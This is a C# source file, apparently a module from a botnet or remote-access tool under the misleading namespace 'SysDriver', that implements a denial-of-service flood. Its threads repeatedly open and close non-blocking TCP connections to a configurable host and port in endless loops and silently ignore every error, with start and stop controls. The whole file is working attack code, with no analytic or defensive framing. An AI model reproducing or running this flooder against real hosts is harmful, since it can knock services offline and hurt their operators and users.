using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver;

internal class nSYNFlood
{
	private class SYNRequest
	{
		private IPEndPoint IPEo;

		private Socket[] pSocket;

		private int iSSockets;

		public SYNRequest(IPEndPoint tIPEo, int tSSockets)
		{
			IPEo = tIPEo;
			iSSockets = tSSockets;
		}

		private void OnConnect(IAsyncResult ar)
		{
		}

		public void Send()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						pSocket = new Socket[iSSockets];
						for (int i = 0; i < iSSockets; i++)
						{
							pSocket[i] = new Socket(IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							pSocket[i].Blocking = false;
							AsyncCallback callback = OnConnect;
							pSocket[i].BeginConnect(IPEo, callback, pSocket[i]);
						}
						Thread.Sleep(100);
						for (int i = 0; i < iSSockets; i++)
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						pSocket = null;
					}
				}
				catch
				{
					for (int i = 0; i < iSSockets; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	private static IPEndPoint IPEo;

	public static ushort uPort;

	private static SYNRequest[] SYNClass;

	public static int iSSockets;

	public static int iThreads;

	public static void StartSYNFlood()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		SYNClass = new SYNRequest[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			SYNClass[i] = new SYNRequest(IPEo, iSSockets);
			tFloodingJob[i] = SYNClass[i].Send;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void StopSYNFlood()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Abort();
				tFloodingThread[i].Join();
			}
			catch
			{
			}
		}
	}
}
